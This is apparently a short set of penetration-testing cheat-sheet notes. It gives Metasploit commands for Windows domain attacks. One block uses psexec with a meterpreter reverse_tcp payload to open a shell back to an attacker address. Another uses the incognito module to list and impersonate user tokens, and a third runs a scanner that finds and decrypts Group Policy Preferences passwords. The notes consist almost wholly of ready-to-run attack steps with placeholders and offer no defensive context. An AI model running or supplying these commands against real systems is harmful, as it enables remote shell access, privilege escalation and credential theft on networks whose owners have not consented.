--  -
#### Get Shell
```bash
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp # depends
set rhosts <target ip>
set smbdomain <domain>
set smbuser <username>
set smbpass <password>
set lhost <attack ip>
run
```

^66f29a

#### Icognito Module
Module used for #token-impersonation
```bash
load icognito
list_tokens -u
impersonate_token <user>
```

^c51a79

#### GPP Attack
```bash
# will look for the file and cPassword field and decrypt it for you.
msfconsole
use auxiliary/scanner/smb_enum_gpp
```

^030f63
